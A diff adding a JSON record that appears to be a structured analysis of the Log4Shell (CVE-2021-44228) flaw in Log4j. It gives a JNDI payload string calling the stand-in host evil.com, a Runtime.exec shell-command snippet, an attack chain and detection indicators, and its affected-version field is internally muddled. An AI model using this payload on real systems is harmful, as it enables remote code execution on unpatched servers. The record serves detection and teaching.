@@ -1,0 +1,104 @@
+{
+  "package_info": {
+    "package_name": "log4j",
+    "package_manager": "Maven (Java)",
+    "package_versions": "2.0-beta9 through 2.17.0 (excluding 2.15.0, 2.16.0, 2.17.1)",
+    "why_malicious": "Older versions of Log4j (prior to 2.17.1) contain a vulnerability (Log4Shell, CVE-2021-44228 and related CVEs) that allows attackers to inject specially crafted log messages which trigger remote code execution via JNDI lookups. This enables arbitrary code execution on the target system, making the package as shipped in these versions dangerous and exploitable."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (when a log message is processed)",
+        "file_location": "application code using vulnerable Log4j version (e.g., logger.error(...))",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "logger.error(\"Output:\" + \"${jndi:ldap://evil.com:9999/Evil}\");",
+      "code_language": "java",
+      "code_behavior": "At runtime, the code logs a message containing a JNDI LDAP reference, which Log4j interprets and triggers a remote lookup to an attacker-controlled LDAP server, resulting in the download and deserialization of a remote Java class, leading to arbitrary code execution.",
+      "malice_analysis": {
+        "why_suspicious": "The use of JNDI lookups in log messages allows attackers to inject remote references that are automatically resolved and executed, enabling remote code execution.",
+        "violated_expectations": "Normal logging libraries should not interpret log message content as executable code or perform network lookups based on log message content.",
+        "similar_legitimate_use": "JNDI lookups can be used legitimately in enterprise Java applications for resource discovery, but not in log message parsing.",
+        "key_indicators": [
+          "Presence of ${jndi:...} patterns in log messages",
+          "Automatic network requests triggered by log message content",
+          "Deserialization and execution of remote Java classes"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (after JNDI lookup and class download)",
+        "file_location": "remote Java class served by attacker (e.g., Evil.class)",
+        "required_permissions": [
+          "filesystem",
+          "process_execution"
+        ]
+      },
+      "code_snippet": "String[] cmd = {\n  \"/bin/sh\",\n  \"-c\",\n  \"echo PWNED > /tmp/pwned\"\n};\nRuntime.getRuntime().exec(cmd);",
+      "code_language": "java",
+      "code_behavior": "At runtime, after the malicious class is loaded via JNDI, the code executes a shell command on the victim system, writing a file to /tmp/pwned, demonstrating arbitrary command execution.",
+      "malice_analysis": {
+        "why_suspicious": "The code executes an arbitrary shell command received from a remote source, which is a classic indicator of remote code execution.",
+        "violated_expectations": "Deserialized classes from remote sources should not be executed without validation; logging frameworks should not enable arbitrary code execution.",
+        "similar_legitimate_use": "Runtime.exec may be used in legitimate applications for controlled subprocess management, but not in code loaded from untrusted remote sources.",
+        "key_indicators": [
+          "Deserialization of remote classes",
+          "Use of Runtime.getRuntime().exec with attacker-controlled input",
+          "Creation of files or execution of commands not present in application logic"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a log message containing a JNDI LDAP reference (e.g., ${jndi:ldap://evil.com:9999/Evil}) to an application using vulnerable Log4j.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Log4j interprets the JNDI reference and initiates a remote lookup."
+    },
+    {
+      "step": 2,
+      "action": "Log4j performs a JNDI LDAP lookup to the attacker-controlled server, which responds with a reference to a remote Java class (e.g., http://evil.com:8000/Evil.class).",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The vulnerable system downloads and deserializes the remote class."
+    },
+    {
+      "step": 3,
+      "action": "The remote Java class (Evil.class) is loaded and executed, running arbitrary code on the victim system (e.g., writing to /tmp/pwned).",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker achieves remote code execution on the target system."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log message content containing ${jndi:ldap://...} or similar patterns",
+      "Unexpected outbound LDAP or RMI network requests from Java applications",
+      "Deserialization and execution of remote Java classes",
+      "Unusual process execution (e.g., shell commands) triggered by log processing"
+    ],
+    "file_indicators": [
+      "Presence of log messages with ${jndi:...} patterns",
+      "Downloaded .class files from untrusted sources",
+      "Unexpected files created by Java processes (e.g., /tmp/pwned)"
+    ],
+    "network_indicators": [
+      "Outbound LDAP requests to external or untrusted servers",
+      "HTTP requests to attacker-controlled domains (e.g., evil.com:8000/Evil.class)",
+      "Unusual JNDI lookups in application logs"
+    ],
+    "how_to_detect": "Monitor application logs for suspicious patterns such as ${jndi:ldap://...}. Detect and alert on unexpected outbound LDAP or RMI connections from Java applications, especially to external IPs/domains. Watch for Java processes downloading and deserializing remote .class files. Correlate these events with process execution or file creation that is not part of normal application behavior."
+  }
+}
